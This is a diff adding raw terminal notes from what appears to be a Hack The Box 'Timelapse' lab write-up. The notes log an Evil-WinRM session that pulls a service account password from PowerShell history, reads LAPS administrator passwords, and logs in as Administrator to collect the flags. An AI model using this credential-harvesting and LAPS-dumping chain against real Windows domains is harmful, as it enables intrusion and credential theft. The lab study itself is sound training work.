@@ -167,3 +167,601 @@ nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
 ```
 
 but unable to connect to the smbclient
+
+trying again 
+
+```
+~/Downloads/timelapse ⌚ 2:30:18
+$ ../evil-winrm-3.4/evil-winrm.rb -S -k legacy.key -c legacy.cert -i 10.10.11.152
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cd C:\Users\
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users> cd legaccy
+Cannot find path 'C:\Users\legaccy' because it does not exist.
+At line:1 char:1
++ cd legaccy
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\legaccy:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users> cd legacyy
+*Evil-WinRM* PS C:\Users\legacyy> dir
+
+
+    Directory: C:\Users\legacyy
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       10/25/2021   8:25 AM                Desktop
+d-r---       10/25/2021   8:22 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/14/2022   1:41 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
+68a246d75e3db8dec7f09fc39da2dc21
+
+```
+# going for root
+
+```
+C:\Users\legacyy\Desktop> net user legacyy
+User name                    legacyy
+Full Name                    Legacyy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2021 12:17:10 PM
+Password expires             Never
+Password changeable          10/24/2021 12:17:10 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   7/14/2022 2:00:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *Development
+The command completed successfully.
+
+```
+
+echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+
+foor getting history
+```
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+```
+
+ful process
+
+```
+~/Downloads/timelapse ⌚ 2:30:18
+$ ../evil-winrm-3.4/evil-winrm.rb -S -k legacy.key -c legacy.cert -i 10.10.11.152
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cd C:\Users\
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users> cd legaccy
+Cannot find path 'C:\Users\legaccy' because it does not exist.
+At line:1 char:1
++ cd legaccy
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\legaccy:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users> cd legacyy
+*Evil-WinRM* PS C:\Users\legacyy> dir
+
+
+    Directory: C:\Users\legacyy
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       10/25/2021   8:25 AM                Desktop
+d-r---       10/25/2021   8:22 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/14/2022   1:41 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
+68a246d75e3db8dec7f09fc39da2dc21
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> 
+
+Warning: Press "y" to exit, press any other key to continue
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            babywyrm                 Guest
+krbtgt                   legacyy                  payl0ad
+sinfulz                  svc_deploy               thecybergeek
+TRX
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legaccy
+net.exe : The user name could not be found.
+    + CategoryInfo          : NotSpecified: (The user name could not be found.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+More help is available by typing NET HELPMSG 2221.*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
+User name                    legacyy
+Full Name                    Legacyy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2021 12:17:10 PM
+Password expires             Never
+Password changeable          10/24/2021 12:17:10 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   7/14/2022 2:00:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *Development
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> cd echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+A positional parameter cannot be found that accepts argument 'C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\'.
+At line:1 char:1
++ cd echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> cd echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+A positional parameter cannot be found that accepts argument 'C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\'.
+At line:1 char:1
++ cd echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> dir
+
+
+    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cd C:\Users
+*Evil-WinRM* PS C:\Users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+*Evil-WinRM* PS C:\Users> 
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+timelapse\svc_deploy
+*Evil-WinRM* PS C:\Users> timelapse\svc_deploy
+The module 'timelapse' could not be loaded. For more information, run 'Import-Module timelapse'.
+At line:1 char:1
++ timelapse\svc_deploy
++ ~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (timelapse\svc_deploy:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CouldNotAutoLoadModule
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {hostname}
+dc01
+*Evil-WinRM* PS C:\Users> dc01
+The term 'dc01' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ dc01
++ ~~~~
+    + CategoryInfo          : ObjectNotFound: (dc01:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /priv}
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /user}
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== ============================================
+timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   7/14/2022 2:20:30 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+At line:1 char:106
++ ... ntial $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADCo ...
++                                                                 ~
+Missing closing '}' in statement block or type definition.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : MissingEndCurlyBrace,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+*Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+
+
+PSComputerName              : localhost
+RunspaceId                  : 5674566e-70e4-438c-a588-54eb51ad8303
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : 50rQ2JwLyHZ5x8B}tlWuFj4z
+ms-Mcs-AdmPwdExpirationTime : 133026937058412636
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
+PSComputerName    : localhost
+RunspaceId        : 5674566e-70e4-438c-a588-54eb51ad8303
+DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DB01
+ObjectClass       : computer
+ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
+SamAccountName    : DB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1606
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : 5674566e-70e4-438c-a588-54eb51ad8303
+DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : WEB01
+ObjectClass       : computer
+ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
+SamAccountName    : WEB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1607
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : 5674566e-70e4-438c-a588-54eb51ad8303
+DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DEV01
+ObjectClass       : computer
+ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
+SamAccountName    : DEV01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1608
+UserPrincipalName :
+
+
+
+*Evil-WinRM* PS C:\Users> exit
+
+Info: Exiting with code 0
+
+
+~/Downloads/timelapse ⌚ 2:53:05
+$ ../evil-winrm-3.4/evil-winrm.rb -u 'Administrator' -p '50rQ2JwLyHZ5x8B}tlWuFj4z' -i 10.10.11.152 -S
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
+At line:1 char:1
++ type root.txt
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       10/23/2021  11:27 AM                3D Objects
+d-r---       10/23/2021  11:27 AM                Contacts
+d-r---         3/3/2022   7:48 PM                Desktop
+d-r---       10/23/2021  12:22 PM                Documents
+d-r---       10/25/2021   2:06 PM                Downloads
+d-r---       10/23/2021  11:27 AM                Favorites
+d-r---       10/23/2021  11:28 AM                Links
+d-r---       10/23/2021  11:27 AM                Music
+d-r---       10/23/2021  11:27 AM                Pictures
+d-r---       10/23/2021  11:27 AM                Saved Games
+d-r---       10/23/2021  11:27 AM                Searches
+d-r---       10/23/2021  11:27 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd Documents
+Cannot find path 'C:\Users\Administrator\Desktop\Documents' because it does not exist.
+At line:1 char:1
++ cd Documents
++ ~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\Documents:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Documents
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users> cd svc_deploy
+*Evil-WinRM* PS C:\Users\svc_deploy> dir
+
+
+    Directory: C:\Users\svc_deploy
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/23/2022   6:05 PM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+c*Evil-WinRM* PS C:\Users\svc_deploy> cd Desktop
+*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> dir
+*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> cd ..
+*Evil-WinRM* PS C:\Users\svc_deploy> cd ..
+*Evil-WinRM* PS C:\Users> cd TRX
+*Evil-WinRM* PS C:\Users\TRX> dir
+
+
+    Directory: C:\Users\TRX
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         3/3/2022  10:45 PM                3D Objects
+d-r---         3/3/2022  10:45 PM                Contacts
+d-r---         3/3/2022  10:45 PM                Desktop
+d-r---         3/3/2022  10:45 PM                Documents
+d-r---         3/3/2022  10:45 PM                Downloads
+d-r---         3/3/2022  10:45 PM                Favorites
+d-r---         3/3/2022  10:45 PM                Links
+d-r---         3/3/2022  10:45 PM                Music
+d-r---         3/3/2022  10:45 PM                Pictures
+d-r---         3/3/2022  10:45 PM                Saved Games
+d-r---         3/3/2022  10:45 PM                Searches
+d-r---         3/3/2022  10:45 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\TRX> cd Desktop
+*Evil-WinRM* PS C:\Users\TRX\Desktop> dir
+
+
+    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/14/2022   1:41 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
+9fdce9a5bc69225c0f14eded65118f3b
+
+```
+
+https://aidenpearce369.github.io/htb/offsec/timelapse/
+
+imp command  - *Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+
+getting powershell run history
